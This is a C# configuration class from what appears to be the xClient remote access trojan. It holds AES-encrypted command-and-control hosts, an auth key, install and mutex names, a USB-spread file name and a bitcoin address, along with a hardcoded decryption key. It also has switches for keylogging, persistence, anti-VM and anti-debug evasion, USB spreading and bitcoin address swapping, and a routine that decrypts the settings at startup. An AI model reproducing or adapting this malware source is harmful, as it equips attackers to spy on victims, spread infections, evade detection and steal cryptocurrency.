using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "qL7ABVEgRPQITnSF2or/xdj+U5DMlvxvvOIyTg3JjYZxMmzQMy/E7QI2/IUR2yRhjv5L/hGQKGT8s3Z+z3MoEw==";

	public static string HOSTS = "Zr2lsFSfm+0dgzVy29vtnAe/xgenadSzLSRm4ZCcZE83UPnZPjTFGRbkf5uUIcqgSaA2lKaAF8gqLfmM7AprzxfI72wWa0nkmXm2yEVChds=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "w6Ol+rkSRNv1xGXrPINuxw==";

	public static string AUTHKEY = "HeGtMS3gMcOHZHqF7k2PRdU26FvD4bKZCZzCmoWURPWMRK6mNrx9jo47u8ZYR9tH403g6DmjScTKdCyeu5oaEg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "Qwe2sVqg8Mfd5QDzE1RbZtZ9bRnItQ7NGQ3XG7v/FWazcfMQBokt60WoC23lgU6OeGdoT5vb0ziF5A/H/fUP8w==";

	public static string INSTALLNAME = "nBuo/xCHotx6OOLBj+miFLQzwEjLqZp+KXh1WzyhLzabk+Vec1KMGg6TRjgsYiLzbpoSLsIqEvELgYQ+pGlmDQ==";

	public static bool INSTALL = false;

	public static bool STARTUP = false;

	public static string MUTEX = "cQ6k4+gRpzkr8xCC61trs36MTaJ6KAIpzpbhh0qAIqSFPQiY9FICZA04c9R6oEaqQ2iGhmN/i1KE0nOGJO6S6zoRWtwtYo4lAgFfPWw0TUI=";

	public static string STARTUPKEY = "IX1ZR+XE5MqCjX5Ij9wl+YU8W97EYXOIpAi1oc9vA+s5WZxTSVCGQWAfCmsuT3Y2DUcolvvsxEpVCGvPjt/l6QSB9bt1c81IGLMMSDmfmCs=";

	public static bool HIDEFILE = false;

	public static bool ENABLELOGGER = true;

	public static string ENCRYPTIONKEY = "gPm8k05MmnsEEyh3lOt7";

	public static string TAG = "FWK++8KA6nl7yzQ6t5grcHiRTaOAPjonRi9j5+Vup5lTeLKFfCrXelIp8YyCeSsqfAAvDe7YtAuoCZyCnZ11rw==";

	public static string LOGDIRECTORYNAME = "cFtVa5qeFIqk/fAeqiyg7JP3yNtdQhEyWnOiCfr1A7a1wvSfoOTY7ay6BUZqXo1ovXBBxkAVBOKx5bN//0hU7Q==";

	public static string USBSpreadNAME = "F7MsI3qeVjSvB4+pIjnKKJKHKIQ5iuAFxunx15JL7r8FtuMNMvQDTPP2s4fbsNkTjlPAlz5BOpW2Nnd8c7Ft2Q==";

	public static string BTCAddress = "+L9uXvEJVx/VLws/AkSBlZqal1x0WpdCZzQgWPnHXoGhB0uzY90Q2vNPbQCDZ7Ps4P65G0yv9VNkYBFWfId/3w==";

	public static bool HIDELOGDIRECTORY = false;

	public static bool HIDEINSTALLSUBDIRECTORY = false;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = false;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
